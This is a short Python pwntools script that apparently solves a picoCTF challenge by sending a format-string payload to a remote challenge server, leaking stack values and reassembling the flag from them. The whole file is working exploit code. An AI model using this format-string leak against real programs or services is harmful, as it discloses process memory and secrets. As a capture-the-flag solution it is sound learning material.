from pwn import *

context.bits = 64
context.arch = "x86-64"

target = remote("mimas.picoctf.net", 57749)

# From testing, the flag ASCII bytes start appearing at arg 14.
flagArg = 14
flagLengthBytes = 8 # max length of the flag in arguments (64 bytes total)
toSend = b''

# Craft the leak payload
for i in range(flagLengthBytes):
    toSend += b'%' + str(flagArg+i).encode() + b'$lx|||'

# Read in the leaks
target.recvuntil(b':')
target.sendline(toSend)
response = target.recvall().split(b'\n')[1].split(b': ')[1].decode()
split = response.split("|||")

# Parse any newline characters by converting any '0xa' to '0x0a'
for i in range(len(split)):
    if split[i].startswith("a"):
        split[i] = "0" + split[i]

flag = ""

# Reverse each 8-byte chunk and put it all together
for chunk in split:
    for i in range(len(chunk)-1, 0, -2):
        flag += chr(int(chunk[i-1]+chunk[i], 16))

print(flag)